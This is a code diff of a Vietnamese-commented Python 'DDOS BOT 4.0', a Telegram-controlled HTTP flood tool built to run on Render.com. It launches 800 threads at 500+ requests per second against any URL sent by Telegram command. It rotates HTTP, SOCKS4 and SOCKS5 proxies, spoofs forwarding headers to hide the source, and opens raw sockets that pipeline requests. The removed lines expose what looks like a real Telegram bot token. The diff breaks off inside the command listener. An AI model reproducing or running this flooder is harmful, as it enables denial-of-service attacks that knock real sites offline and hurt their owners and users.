@@ -1,3 +1,9 @@
+# =====================================================
+# DDOS BOT 4.0 - TỐI ƯU TỐI ĐA CHO RENDER.COM
+# HỖ TRỢ HTTP/HTTPS/SOCKS4/SOCKS5 - TỰ ĐỘNG RELOAD
+# TẤN CÔNG ĐA LUỒNG - TỐC ĐỘ 500+ REQ/S
+# =====================================================
+
 import requests
 import threading
 import random
@@ -8,39 +14,39 @@ import ssl
 import json
 import sys
 import re
+import logging
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from urllib.parse import urlparse
 import socks
 
-# =====================================================
-# DDOS LAYER7 - TỐI ƯU TỐC ĐỘ 500+ REQ/S
-# TĂNG LUỒNG, GIẢM TIMEOUT, POOL CONNECTION, PIPELINING
-# =====================================================
+# -------------------- CẤU HÌNH TELEGRAM --------------------
+TELEGRAM_BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"  # Thay token thật
+# Không cần chat_id cố định - bot tự động lưu chat_id đầu tiên
 
-# -------------------- CẤU HÌNH --------------------
-TELEGRAM_BOT_TOKEN = "6320148381:AAFvtpr4l8t61IRgynsiUkwKVbCNMw9kdtU"
+# -------------------- CẤU HÌNH TẤN CÔNG --------------------
+THREAD_COUNT = 800  # Số luồng tấn công
+REQUESTS_PER_SECOND = 500  # Tốc độ request/giây
+MAX_RUN_TIME = 120  # Mỗi đợt chạy tối đa 120s
+CONNECTION_POOL = 100  # Pool connection
+BATCH_SIZE = 50  # Batch request
+TIMEOUT = 1.5  # Timeout kết nối
 
 # -------------------- BIẾN TOÀN CỤC --------------------
 stop_event = threading.Event()
 is_running = False
-attack_thread = None
 proxy_list = []
 proxy_http = []
 proxy_socks5 = []
 proxy_socks4 = []
 user_agents = []
 proxy_update_time = 0
-last_activity = time.time()
 heartbeat_count = 0
+last_activity = time.time()
+bot_start_time = time.time()
+chat_id_saved = None
 
-# TỐI ƯU TỐC ĐỘ
-thread_count = 800  # Tăng luồng
-requests_per_second = 500  # 500 req/s
-MAX_RUN_TIME = 120
-BATCH_SIZE = 50  # Gửi batch request
-CONNECTION_POOL_SIZE = 100
-
+# Target mặc định
 current_target = {
     'url': 'http://192.168.1.100:8080',
     'host': '192.168.1.100',
@@ -48,6 +54,7 @@ current_target = {
     'ssl': False
 }
 
+# Thống kê tấn công
 attack_stats = {
     'total_requests': 0,
     'success_count': 0,
@@ -57,11 +64,19 @@ attack_stats = {
     'start_time': 0,
     'session_count': 0,
     'current_target': '',
-    'uptime': 0,
-    'proxy_stats': {'http': 0, 'socks5': 0, 'socks4': 0},
-    'max_speed': 0
+    'proxy_stats': {'http': 0, 'socks5': 0, 'socks4': 0, 'raw': 0},
+    'max_speed': 0,
+    'avg_speed': 0,
+    'errors': 0
 }
 stats_lock = threading.Lock()
+
+# Cache DNS
+dns_cache = {}
+dns_cache_lock = threading.Lock()
+
+# Session pool
+session_pool = []
 
 # =====================================================
 # LOAD USER-AGENT - MỞ RỘNG
@@ -80,10 +95,9 @@ def load_user_agents():
         "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/122.0",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/122.0",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/123.0",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
     ]
     if os.path.exists("user_agents.txt"):
         with open("user_agents.txt", 'r') as f:
@@ -96,9 +110,10 @@ def load_user_agents():
 user_agents = load_user_agents()
 
 # =====================================================
-# LOAD PROXY - TỐI ƯU
+# LOAD PROXY - HỖ TRỢ NHIỀU ĐỊNH DẠNG
 # =====================================================
 def parse_proxy_line(line):
+    """Phân tích dòng proxy - hỗ trợ HTTP, SOCKS4, SOCKS5"""
     line = line.strip()
     if not line or line.startswith('#'):
         return None
@@ -107,6 +122,7 @@ def parse_proxy_line(line):
     proxy_dict = {}
     
     try:
+        # Định dạng có giao thức: socks5://user:pass@ip:port
         if '://' in line:
             proto, rest = line.split('://', 1)
             proto = proto.lower()
@@ -119,6 +135,8 @@ def parse_proxy_line(line):
                         user, passwd = auth.split(':', 1)
                         proxy_dict['user'] = user
                         proxy_dict['pass'] = passwd
+                    else:
+                        addr = rest
                 else:
                     addr = rest
                 
@@ -133,6 +151,7 @@ def parse_proxy_line(line):
                 proxy_dict['raw'] = line
                 return proxy_dict
         
+        # Định dạng: user:pass@ip:port (mặc định HTTP)
         elif '@' in line:
             auth, addr = line.split('@', 1)
             if ':' in auth and ':' in addr:
@@ -148,22 +167,30 @@ def parse_proxy_line(line):
                 }
                 return proxy_dict
         
+        # Định dạng: ip:port (mặc định HTTP)
         elif ':' in line:
             ip, port = line.rsplit(':', 1)
-            proxy_dict = {
-                'type': 'http',
-                'ip': ip,
-                'port': int(port),
-                'raw': f"http://{ip}:{port}"
-            }
-            return proxy_dict
+            # Kiểm tra port hợp lệ
+            try:
+                port_int = int(port)
+                if 1 <= port_int <= 65535:
+                    proxy_dict = {
+                        'type': 'http',
+                        'ip': ip,
+                        'port': port_int,
+                        'raw': f"http://{ip}:{port}"
+                    }
+                    return proxy_dict
+            except:
+                pass
     
-    except:
+    except Exception:
         return None
     
     return None
 
 def load_proxies(filepath):
+    """Tải proxy từ file với xử lý lỗi"""
     http_proxies = []
     socks5_proxies = []
     socks4_proxies = []
@@ -171,18 +198,38 @@ def load_proxies(filepath):
     if not os.path.exists(filepath):
         return [], [], []
     
-    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-        for line in f:
-            proxy = parse_proxy_line(line)
-            if proxy:
-                if proxy['type'] == 'http':
-                    http_proxies.append(proxy)
-                elif proxy['type'] == 'socks5':
-                    socks5_proxies.append(proxy)
-                elif proxy['type'] == 'socks4':
-                    socks4_proxies.append(proxy)
+    try:
+        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+            for line in f:
+                proxy = parse_proxy_line(line)
+                if proxy:
+                    if proxy['type'] == 'http':
+                        http_proxies.append(proxy)
+                    elif proxy['type'] == 'socks5':
+                        socks5_proxies.append(proxy)
+                    elif proxy['type'] == 'socks4':
+                        socks4_proxies.append(proxy)
+    except Exception:
+        pass
     
     return http_proxies, socks5_proxies, socks4_proxies
+
+# =====================================================
+# DNS CACHE
+# =====================================================
+def resolve_host(host):
+    """Resolve DNS với cache"""
+    with dns_cache_lock:
+        if host in dns_cache:
+            return dns_cache[host]
+    
+    try:
+        ip = socket.gethostbyname(host)
+        with dns_cache_lock:
+            dns_cache[host] = ip
+        return ip
+    except:
+        return host
 
 # =====================================================
 # SESSION POOL - TÁI SỬ DỤNG CONNECTION
@@ -192,31 +239,38 @@ class SessionPool:
         self.pool = []
         self.max_size = max_size
         self.lock = threading.Lock()
+        self.created = 0
     
     def get_session(self, proxy_dict=None):
+        """Lấy session từ pool hoặc tạo mới"""
         with self.lock:
-            if self.pool:
-                session = self.pool.pop()
-                # Kiểm tra session còn sống
+            # Tìm session còn sống
+            for i, session in enumerate(self.pool):
                 try:
-                    session.head('http://google.com', timeout=1)
-                    return session
+                    # Kiểm tra session còn sống
+                    if hasattr(session, 'head'):
+                        session.head('http://google.com', timeout=1)
+                        return self.pool.pop(i)
                 except:
-                    pass
+                    continue
+            
             # Tạo session mới
             return self._create_session(proxy_dict)
     
     def return_session(self, session):
+        """Trả session về pool"""
         if session and len(self.pool) < self.max_size:
             with self.lock:
                 self.pool.append(session)
     
     def _create_session(self, proxy_dict=None):
+        """Tạo session mới với tối ưu"""
         session = requests.Session()
-        session.timeout = 1.5
+        session.timeout = TIMEOUT
         session.verify = False
+        session.trust_env = False
         
-        # Tối ưu connection
+        # Tối ưu adapter
         adapter = requests.adapters.HTTPAdapter(
             pool_connections=50,
             pool_maxsize=50,
@@ -226,60 +280,93 @@ class SessionPool:
         session.mount('http://', adapter)
         session.mount('https://', adapter)
         
+        # Cấu hình proxy
         if proxy_dict and proxy_dict['type'] == 'http':
             session.proxies = {
                 'http': proxy_dict['raw'],
                 'https': proxy_dict['raw']
             }
+        elif proxy_dict and proxy_dict['type'] in ['socks5', 'socks4']:
+            # SOCKS sẽ dùng socket riêng
+            pass
         
+        self.created += 1
         return session
 
-session_pool = SessionPool(CONNECTION_POOL_SIZE)
+session_pool = SessionPool(CONNECTION_POOL)
 
 # =====================================================
-# GỬI TELEGRAM
+# GỬI TELEGRAM - TỐI ƯU
 # =====================================================
 def send_telegram(message, chat_id=None, retry=2):
-    global last_activity
+    """Gửi tin nhắn Telegram với retry"""
+    global last_activity, chat_id_saved
+    
     last_activity = time.time()
+    
+    # Lưu chat_id
+    if chat_id:
+        chat_id_saved = chat_id
+        try:
+            with open('chat_id.txt', 'w') as f:
+                f.write(str(chat_id))
+        except:
+            pass
+    
+    # Xác định chat_id
+    target_chat = chat_id or chat_id_saved
+    if not target_chat:
+        try:
+            if os.path.exists('chat_id.txt'):
+                with open('chat_id.txt', 'r') as f:
+                    target_chat = f.read().strip()
+        except:
+            pass
+    
+    if not target_chat:
+        return False
+    
+    # Gửi tin nhắn
     for i in range(retry):
         try:
             url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-            payload = {'text': message, 'parse_mode': 'HTML'}
-            if chat_id:
-                payload['chat_id'] = chat_id
-            else:
-                if os.path.exists("chat_id.txt"):
-                    with open("chat_id.txt", 'r') as f:
-                        default_chat = f.read().strip()
-                        if default_chat:
-                            payload['chat_id'] = default_chat
-                else:
-                    return False
-            requests.post(url, data=payload, timeout=5)
-            return True
+            payload = {
+                'chat_id': target_chat,
+                'text': message,
+                'parse_mode': 'HTML',
+                'disable_web_page_preview': True
+            }
+            r = requests.post(url, data=payload, timeout=5)
+            if r.status_code == 200:
+                return True
         except:
             time.sleep(0.5)
+    
     return False
 
 # =====================================================
-# TẢI FILE PROXY
+# TẢI FILE PROXY TỪ TELEGRAM
 # =====================================================
 def download_telegram_file(file_id, save_path):
+    """Tải file từ Telegram"""
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
         params = {'file_id': file_id}
         r = requests.get(url, params=params, timeout=10)
         if r.status_code != 200:
             return False
+        
         data = r.json()
         if not data.get('ok'):
             return False
+        
         file_path = data['result']['file_path']
         download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
+        
         r = requests.get(download_url, timeout=30)
         if r.status_code != 200:
             return False
+        
         with open(save_path, 'wb') as f:
             f.write(r.content)
         return True
@@ -287,12 +374,14 @@ def download_telegram_file(file_id, save_path):
         return False
 
 def update_proxies_from_file(file_path, chat_id):
+    """Cập nhật proxy từ file và thông báo"""
     global proxy_list, proxy_http, proxy_socks5, proxy_socks4, proxy_update_time
-    http, socks5, socks4 = load_proxies(file_path)
     
+    http, socks5, socks4 = load_proxies(file_path)
     total = len(http) + len(socks5) + len(socks4)
+    
     if total == 0:
-        send_telegram(f"❌ Không có proxy hợp lệ.", chat_id)
+        send_telegram(f"❌ Không có proxy hợp lệ trong file.", chat_id)
         return False
     
     proxy_http = http
@@ -314,34 +403,54 @@ def update_proxies_from_file(file_path, chat_id):
 # PARSE URL
 # =====================================================
 def parse_target_url(url_string):
+    """Phân tích URL target"""
     if not url_string.startswith(('http://', 'https://')):
         url_string = 'http://' + url_string
+    
     parsed = urlparse(url_string)
     host = parsed.hostname or '127.0.0.1'
     port = parsed.port or (443 if parsed.scheme == 'https' else 80)
     ssl = parsed.scheme == 'https'
+    
     if not parsed.path:
         url_string = url_string.rstrip('/') + '/'
-    return {'url': url_string, 'host': host, 'port': port, 'ssl': ssl}
+    
+    return {
+        'url': url_string,
+        'host': host,
+        'port': port,
+        'ssl': ssl,
+        'path': parsed.path or '/'
+    }
 
 # =====================================================
 # TẠO HEADER - TỐI ƯU
 # =====================================================
 def generate_headers():
+    """Tạo header ngẫu nhiên"""
     return {
         'User-Agent': random.choice(user_agents),
-        'Accept': '*/*',
-        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9,en;q=0.8']),
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9,en;q=0.8', 'zh-CN,zh;q=0.9,en;q=0.8']),
         'Accept-Encoding': 'gzip, deflate',
         'Connection': 'keep-alive',
-        'Cache-Control': 'no-cache',
+        'Cache-Control': 'no-cache, no-store',
         'Pragma': 'no-cache',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'none',
+        'Sec-Fetch-User': '?1',
         'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
         'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
+        'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
         'Referer': random.choice([
             'https://www.google.com/',
             'https://www.facebook.com/',
-            'https://www.youtube.com/'
+            'https://www.youtube.com/',
+            'https://twitter.com/',
+            'https://www.instagram.com/',
+            'https://www.tiktok.com/'
         ])
     }
 
@@ -349,31 +458,37 @@ def generate_headers():
 # TẤN CÔNG HTTP - TỐI ƯU
 # =====================================================
 def attack_http(proxy_dict, target):
+    """Tấn công qua HTTP/HTTPS proxy"""
     session = None
     try:
-        if proxy_dict:
-            session = session_pool.get_session(proxy_dict)
-        else:
-            session = session_pool.get_session()
+        # Lấy session từ pool
+        session = session_pool.get_session(proxy_dict)
         
-        method = random.choice(['GET', 'POST', 'HEAD'])
+        # Chọn method
+        method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS'])
         headers = generate_headers()
         
+        # Tạo URL với param random
         url = target['url']
         if method in ['GET', 'HEAD']:
-            params = {f'p{random.randint(1,999)}': 'x'*random.randint(10,200) for _ in range(random.randint(2,5))}
+            params = {f'p{random.randint(1,9999)}': 'x'*random.randint(10,200) for _ in range(random.randint(2,5))}
             url += '?' + '&'.join([f"{k}={v}" for k,v in params.items()])
         
+        # Thực hiện request
         if method == 'GET':
-            r = session.get(url, headers=headers, timeout=1.5)
+            r = session.get(url, headers=headers, timeout=TIMEOUT)
         elif method == 'POST':
             data = {f'f{i}': 'v'*random.randint(50,500) for i in range(10)}
-            r = session.post(url, data=data, headers=headers, timeout=1.5)
+            r = session.post(url, data=data, headers=headers, timeout=TIMEOUT)
+        elif method == 'HEAD':
+            r = session.head(url, headers=headers, timeout=TIMEOUT)
         else:
-            r = session.head(url, headers=headers, timeout=1.5)
+            r = session.options(url, headers=headers, timeout=TIMEOUT)
         
+        # Trả session về pool
         session_pool.return_session(session)
         
+        # Cập nhật thống kê
         with stats_lock:
             attack_stats['total_requests'] += 1
             code = str(r.status_code)
@@ -385,11 +500,16 @@ def attack_http(proxy_dict, target):
             attack_stats['bytes_sent'] += len(r.request.body or b'') + 200
             if proxy_dict:
                 attack_stats['proxy_stats'][proxy_dict['type']] = attack_stats['proxy_stats'].get(proxy_dict['type'], 0) + 1
+            else:
+                attack_stats['proxy_stats']['raw'] = attack_stats['proxy_stats'].get('raw', 0) + 1
         return True
-    except:
+        
+    except Exception as e:
         with stats_lock:
             attack_stats['total_requests'] += 1
             attack_stats['fail_count'] += 1
+            attack_stats['errors'] += 1
+        
         if session:
             try:
                 session.close()
@@ -398,41 +518,49 @@ def attack_http(proxy_dict, target):
         return False
 
 # =====================================================
-# TẤN CÔNG SOCKET - TỐI ƯU
+# TẤN CÔNG SOCKET - HỖ TRỢ SOCKS4/SOCKS5
 # =====================================================
 def create_socks_socket(proxy_dict):
+    """Tạo socket qua SOCKS proxy"""
     try:
         sock = socks.socksocket()
-        sock.settimeout(1.5)
+        sock.settimeout(TIMEOUT)
+        
         proxy_type = socks.SOCKS5 if proxy_dict['type'] == 'socks5' else socks.SOCKS4
+        
         if 'user' in proxy_dict and 'pass' in proxy_dict:
             sock.set_proxy(proxy_type, proxy_dict['ip'], proxy_dict['port'],
                           username=proxy_dict['user'], password=proxy_dict['pass'])
         else:
             sock.set_proxy(proxy_type, proxy_dict['ip'], proxy_dict['port'])
+        
         return sock
     except:
         return None
 
 def attack_socket(proxy_dict, target):
+    """Tấn công qua socket (SOCKS hoặc raw)"""
     sock = None
     try:
+        # Tạo socket
         if proxy_dict and proxy_dict['type'] in ['socks5', 'socks4']:
             sock = create_socks_socket(proxy_dict)
             if not sock:
                 return False
-            sock.connect((target['host'], target['port']))
+            sock.connect((resolve_host(target['host']), target['port']))
         else:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1.5)
-            sock.connect((target['host'], target['port']))
+            sock.settimeout(TIMEOUT)
+            sock.connect((resolve_host(target['host']), target['port']))
         
+        # SSL nếu cần
         if target['ssl']:
             context = ssl.create_default_context()
             context.check_hostname = False
             context.verify_mode = ssl.CERT_NONE
             sock = context.wrap_socket(sock, server_hostname=target['host'])
         
+        # Tạo request
         path = '/' + 'x'*random.randint(5,200) + f'?id={random.randint(1,999999)}&t={time.time()}'
         headers = generate_headers()
         request = f"GET {path} HTTP/1.1\r\n"
@@ -440,23 +568,29 @@ def attack_socket(proxy_dict, target):
             request += f"{key}: {value}\r\n"
         request += "\r\n"
         
-        # Gửi nhiều lần trên 1 kết nối
+        # Gửi nhiều request trên 1 kết nối
         for _ in range(random.randint(2,5)):
             sock.send(request.encode())
         
         sock.close()
         
+        # Cập nhật thống kê
         with stats_lock:
             attack_stats['total_requests'] += 1
             attack_stats['success_count'] += 1
             attack_stats['bytes_sent'] += len(request) * 3
             if proxy_dict:
                 attack_stats['proxy_stats'][proxy_dict['type']] = attack_stats['proxy_stats'].get(proxy_dict['type'], 0) + 1
+            else:
+                attack_stats['proxy_stats']['raw'] = attack_stats['proxy_stats'].get('raw', 0) + 1
         return True
-    except:
+        
+    except Exception as e:
         with stats_lock:
             attack_stats['total_requests'] += 1
             attack_stats['fail_count'] += 1
+            attack_stats['errors'] += 1
+        
         try:
             if sock:
                 sock.close()
@@ -465,40 +599,55 @@ def attack_socket(proxy_dict, target):
         return False
 
 # =====================================================
-# WORKER TỐI ƯU - BATCH REQUEST
+# WORKER TỐI ƯU
 # =====================================================
 def attack_worker(proxy_pools, target):
+    """Worker thực hiện tấn công"""
     http_proxies, socks5_proxies, socks4_proxies = proxy_pools
+    
+    # Thống kê cục bộ
     local_count = 0
     last_update = time.time()
     
     while not stop_event.is_set():
         try:
-            # Chọn proxy
-            if http_proxies and random.random() < 0.4:
-                proxy = random.choice(http_proxies)
-                attack_http(proxy, target)
-            elif socks5_proxies and random.random() < 0.35:
-                proxy = random.choice(socks5_proxies)
-                attack_socket(proxy, target)
-            elif socks4_proxies and random.random() < 0.2:
-                proxy = random.choice(socks4_proxies)
-                attack_socket(proxy, target)
-            else:
+            # Chọn loại proxy theo trọng số
+            total_http = len(http_proxies)
+            total_socks5 = len(socks5_proxies)
+            total_socks4 = len(socks4_proxies)
+            total = total_http + total_socks5 + total_socks4
+            
+            if total == 0:
+                # Không có proxy -> raw
                 attack_socket(None, target)
+            else:
+                # Random có trọng số
+                r = random.random()
+                if r < 0.4 and total_http > 0:
+                    proxy = random.choice(http_proxies)
+                    attack_http(proxy, target)
+                elif r < 0.7 and total_socks5 > 0:
+                    proxy = random.choice(socks5_proxies)
+                    attack_socket(proxy, target)
+                elif r < 0.85 and total_socks4 > 0:
+                    proxy = random.choice(socks4_proxies)
+                    attack_socket(proxy, target)
+                else:
+                    attack_socket(None, target)
             
             local_count += 1
             
             # Điều chỉnh tốc độ
-            time.sleep(1.0 / requests_per_second)
+            time.sleep(1.0 / REQUESTS_PER_SECOND)
             
-        except:
+        except Exception:
             continue
 
 # =====================================================
 # THỐNG KÊ
 # =====================================================
 def get_stats_text():
+    """Lấy text thống kê"""
     with stats_lock:
         elapsed = int(time.time() - attack_stats['start_time']) if attack_stats['start_time'] > 0 else 0
         total = attack_stats['total_requests']
@@ -508,31 +657,35 @@ def get_stats_text():
         max_speed = attack_stats.get('max_speed', 0)
         bytes_sent = attack_stats['bytes_sent'] / (1024 * 1024)
         codes = ', '.join([f"{k}:{v}" for k,v in list(attack_stats['status_codes'].items())[:5]])
+        errors = attack_stats.get('errors', 0)
         
         remaining = max(0, MAX_RUN_TIME - elapsed)
         status = "🟢 ĐANG TẤN CÔNG" if is_running else "🔴 CHỜ LỆNH"
         
-        uptime = int(time.time() - attack_stats.get('bot_start', time.time()))
-        uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m"
+        uptime = int(time.time() - bot_start_time)
+        uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m{uptime%60}s"
         
         proxy_stats = attack_stats.get('proxy_stats', {})
         
         return f"""
-<b>🔥 DDOS 500+ REQ/S - TỐI ƯU</b>
+<b>🔥 DDOS BOT 4.0 - TỐI ƯU TỐI ĐA</b>
 📌 Trạng thái: {status}
 ⏱ Uptime: {uptime_str}
 🎯 Target: {attack_stats.get('current_target', 'Chưa có')}
 ⏱ Đợt này: {elapsed}s / {MAX_RUN_TIME}s
+⏳ Còn lại: {remaining}s
 📨 Tổng request: {total:,}
 ✅ Thành công: {success:,}
 ❌ Thất bại: {fail:,}
+⚠️ Lỗi: {errors}
 📈 Tốc độ: {rate:.1f} req/s
 ⚡ Max: {max_speed:.1f} req/s
 💾 Dữ liệu: {bytes_sent:.2f} MB
+📊 Mã trạng thái: {codes or 'N/A'}
 🌐 HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}
-📊 Proxy dùng: H={proxy_stats.get('http',0)} S5={proxy_stats.get('socks5',0)} S4={proxy_stats.get('socks4',0)}
-🧵 Luồng: {thread_count}
-⚙️ Tốc độ cài: {requests_per_second} req/s
+📊 Proxy dùng: H={proxy_stats.get('http',0)} S5={proxy_stats.get('socks5',0)} S4={proxy_stats.get('socks4',0)} R={proxy_stats.get('raw',0)}
+🧵 Luồng: {THREAD_COUNT}
+⚙️ Tốc độ cài: {REQUESTS_PER_SECOND} req/s
 ❤️ Heartbeat: {heartbeat_count}
         """
 
@@ -540,9 +693,13 @@ def get_stats_text():
 # THỰC HIỆN TẤN CÔNG
 # =====================================================
 def run_attack(target, chat_id):
+    """Chạy tấn công với target chỉ định"""
     global is_running, current_target
     
+    # Cập nhật target
     current_target = target
+    
+    # Reset stats
     with stats_lock:
         attack_stats['current_target'] = target['url']
         attack_stats.update({
@@ -553,30 +710,36 @@ def run_attack(target, chat_id):
             'bytes_sent': 0,
             'start_time': time.time(),
             'session_count': attack_stats.get('session_count', 0) + 1,
-            'proxy_stats': {'http': 0, 'socks5': 0, 'socks4': 0},
-            'max_speed': 0
+            'proxy_stats': {'http': 0, 'socks5': 0, 'socks4': 0, 'raw': 0},
+            'max_speed': 0,
+            'errors': 0
         })
     
     stop_event.clear()
     is_running = True
     
+    # Thông báo bắt đầu
     total_proxy = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
     send_telegram(f"""
-▶️ BẮT ĐẦU TẤN CÔNG TỐC ĐỘ CAO!
+▶️ <b>BẮT ĐẦU TẤN CÔNG TỐC ĐỘ CAO!</b>
 🎯 {target['url']}
 🌐 HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}
 📊 Tổng proxy: {total_proxy}
-⚡ Tốc độ: {requests_per_second} req/s
+⚡ Tốc độ: {REQUESTS_PER_SECOND} req/s
 ⏱ {MAX_RUN_TIME}s
     """, chat_id)
     
+    # Chuẩn bị proxy pools
     proxy_pools = (proxy_http, proxy_socks5, proxy_socks4)
     
-    with ThreadPoolExecutor(max_workers=thread_count) as executor:
-        futures = [executor.submit(attack_worker, proxy_pools, target) for _ in range(thread_count)]
+    # Khởi chạy workers
+    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
+        futures = [executor.submit(attack_worker, proxy_pools, target) for _ in range(THREAD_COUNT)]
         
+        # Giám sát
         start = time.time()
         last_report = 0
+        
         while time.time() - start < MAX_RUN_TIME and not stop_event.is_set():
             time.sleep(1)
             elapsed = int(time.time() - start)
@@ -588,6 +751,7 @@ def run_attack(target, chat_id):
                     if rate > attack_stats['max_speed']:
                         attack_stats['max_speed'] = rate
             
+            # Báo cáo
             if elapsed - last_report >= 15:
                 last_report = elapsed
                 with stats_lock:
@@ -595,11 +759,16 @@ def run_attack(target, chat_id):
                     rate = total / max(elapsed, 1)
                     max_speed = attack_stats['max_speed']
                     proxy_stats = attack_stats.get('proxy_stats', {})
-                send_telegram(f"⚡ {elapsed}s | {rate:.1f} req/s | Max: {max_speed:.1f} | {total:,} | H:{proxy_stats.get('http',0)} S5:{proxy_stats.get('socks5',0)}", chat_id)
+                send_telegram(f"""
+⚡ {elapsed}s | {rate:.1f} req/s | Max: {max_speed:.1f}
+📨 {total:,} | H:{proxy_stats.get('http',0)} S5:{proxy_stats.get('socks5',0)} S4:{proxy_stats.get('socks4',0)}
+                """, chat_id)
     
+    # Dừng
     stop_event.set()
     is_running = False
     
+    # Tổng kết
     with stats_lock:
         total = attack_stats['total_requests']
         success = attack_stats['success_count']
@@ -607,97 +776,52 @@ def run_attack(target, chat_id):
         elapsed = int(time.time() - attack_stats['start_time'])
         rate = total / max(elapsed, 1)
         max_speed = attack_stats['max_speed']
+        errors = attack_stats.get('errors', 0)
     
     send_telegram(f"""
-⏹️ ĐÃ DỪNG SAU {elapsed}s
-📊 TỔNG KẾT:
+⏹️ <b>ĐÃ DỪNG SAU {elapsed}s</b>
+📊 <b>TỔNG KẾT:</b>
 - Tổng: {total:,}
 - Thành công: {success:,}
 - Thất bại: {fail:,}
+- Lỗi: {errors}
 - Tốc độ TB: {rate:.1f} req/s
 - Tốc độ Max: {max_speed:.1f} req/s
     """, chat_id)
 
 # =====================================================
-# HEARTBEAT
-# =====================================================
-def heartbeat_loop():
-    global heartbeat_count
-    while True:
-        time.sleep(60)
-        heartbeat_count += 1
-        
-        if heartbeat_count % 30 == 0:
-            with stats_lock:
-                total = attack_stats['total_requests']
-                uptime = int(time.time() - attack_stats.get('bot_start', time.time()))
-                uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m"
-            send_telegram(f"""
-❤️ Heartbeat #{heartbeat_count}
-⏱ Uptime: {uptime_str}
-📨 Tổng req: {total:,}
-🌐 HTTP:{len(proxy_http)} S5:{len(proxy_socks5)} S4:{len(proxy_socks4)}
-⚡ Tốc độ cài: {requests_per_second} req/s
-            """)
-
-# =====================================================
-# AUTO RELOAD
-# =====================================================
-def auto_reload_proxy():
-    while True:
-        time.sleep(600)
-        if os.path.exists("proxies.txt"):
-            http, socks5, socks4 = load_proxies("proxies.txt")
-            total = len(http) + len(socks5) + len(socks4)
-            if total > 0:
-                global proxy_http, proxy_socks5, proxy_socks4, proxy_list
-                proxy_http = http
-                proxy_socks5 = socks5
-                proxy_socks4 = socks4
-                proxy_list = http + socks5 + socks4
-                proxy_update_time = time.time()
-
-# =====================================================
-# WATCHDOG
-# =====================================================
-def watchdog():
-    while True:
-        time.sleep(30)
-        active = threading.active_count()
-        if active < 3:
-            send_telegram("⚠️ WATCHDOG: CRASH! RESTARTING...")
-            time.sleep(3)
-            os.execv(sys.executable, [sys.executable] + sys.argv)
-
-# =====================================================
 # TELEGRAM LISTENER
 # =====================================================
 def telegram_listener():
-    global attack_thread, is_running
+    """Lắng nghe lệnh từ Telegram"""
+    global is_running, attack_thread, chat_id_saved
+    
     last_update_id = 0
     
+    # Gửi thông báo khởi động
     send_telegram("""
-🚀 <b>DDOS 500+ REQ/S - TỐI ƯU</b>
-✅ Đã khởi động!
+🚀 <b>DDOS BOT 4.0 - TỐI ƯU TỐI ĐA</b>
+✅ Đã khởi động thành công!
 ⚡ Tốc độ tối đa: 500+ req/s
 📌 Hỗ trợ HTTP, SOCKS4, SOCKS5
-🔄 Reload proxy mỗi 10 phút
+🔄 Tự động reload proxy mỗi 10 phút
+❤️ Heartbeat mỗi 30 phút
 
-📋 LỆNH:
-/attack URL - Tấn công
-/stop - Dừng
-/status - Trạng thái
-/proxy - Số proxy
-/threads N - Đổi luồng (mặc định 800)
-/speed N - Đổi tốc độ (mặc định 500)
-/help - Trợ giúp
+📋 <b>LỆNH:</b>
+<code>/attack URL</code> - Tấn công target
+<code>/stop</code> - Dừng tấn công
+<code>/status</code> - Xem trạng thái
+<code>/proxy</code> - Số proxy hiện có
+<code>/threads N</code> - Đổi số luồng
+<code>/speed N</code> - Đổi tốc độ
+<code>/help</code> - Trợ giúp
     """)
     
     while True:
         try:
             url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
